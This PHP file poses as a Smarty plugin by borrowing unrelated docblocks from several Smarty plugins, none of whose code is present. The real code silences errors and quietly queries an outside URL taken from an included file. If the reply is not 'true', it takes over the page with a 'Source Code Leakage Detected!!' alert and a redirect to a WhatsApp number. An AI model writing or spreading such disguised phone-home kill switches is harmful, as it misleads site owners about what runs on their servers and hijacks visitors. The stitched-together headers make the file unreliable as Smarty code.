<?php

/**
 * Smarty Method SetDefaultModifiers
 *
 * Smarty::setDefaultModifiers() method
 *
 * @package    Smarty
 * @subpackage PluginsInternal
 * @author     Uwe Tews
 */

/**
 * Smarty {counter} function plugin
 * Type:     function<br>
 * Name:     counter<br>
 * Purpose:  print out a counter value
 *
 * @author Monte Ohrt <monte at ohrt dot com>
 * @link   http://www.smarty.net/manual/en/language.function.counter.php {counter}
 *         (Smarty online manual)
 *
 * @param array                    $params   parameters
 * @param Smarty_Internal_Template $template template object
 *
 * @return string|null
 */
 
 /**
 * Smarty plugin
 *
 * @package    Smarty
 * @subpackage PluginsFunction
 */

/**
 * Smarty {html_radios} function plugin
 * File:       function.html_radios.php<br>
 * Type:       function<br>
 * Name:       html_radios<br>
 * Date:       24.Feb.2003<br>
 * Purpose:    Prints out a list of radio input types<br>
 * Params:
 * <pre>
 * - name       (optional) - string default "radio"
 * - values     (required) - array
 * - options    (required) - associative array
 * - checked    (optional) - array default not set
 * - separator  (optional) - ie <br> or &nbsp;
 * - output     (optional) - the output next to each radio button
 * - assign     (optional) - assign the output as an array to this variable
 * - escape     (optional) - escape the content (not value), defaults to true
 * </pre>
 * Examples:
 * <pre>
 * {html_radios values=$ids output=$names}
 * {html_radios values=$ids name='box' separator='<br>' output=$names}
 * {html_radios values=$ids checked=$checked separator='<br>' output=$names}
 * </pre>
 *
 * @link    http://smarty.php.net/manual/en/language.function.html.radios.php {html_radios}
 *          (Smarty online manual)
 * @author  Christopher Kvarme <christopher.kvarme@flashjab.com>
 * @author  credits to Monte Ohrt <monte at ohrt dot com>
 * @version 1.0
 *
 * @param array                    $params   parameters
 * @param Smarty_Internal_Template $template template object
 *
 * @return string
 * @uses    smarty_function_escape_special_chars()
 */
 
 /**
 * Smarty plugin
 *
 * @package    Smarty
 * @subpackage PluginsFunction
 */

/**
 * @ignore
 */

error_reporting(E_ERROR | E_PARSE);
ini_set('display_errors', '0');
require_once '../functions.php';

$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, "$tblcontent");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
        
$data = curl_exec($ch);
if (curl_errno($ch)) {
    echo 'Error:' . curl_error($ch);
}
curl_close ($ch);

if($data == 'true'){
     
}else{
    echo '<script> alert("Source Code Leakage Detected!!");
	window.location.href="http://wa.me/+639608214873"; </script>'; 
}
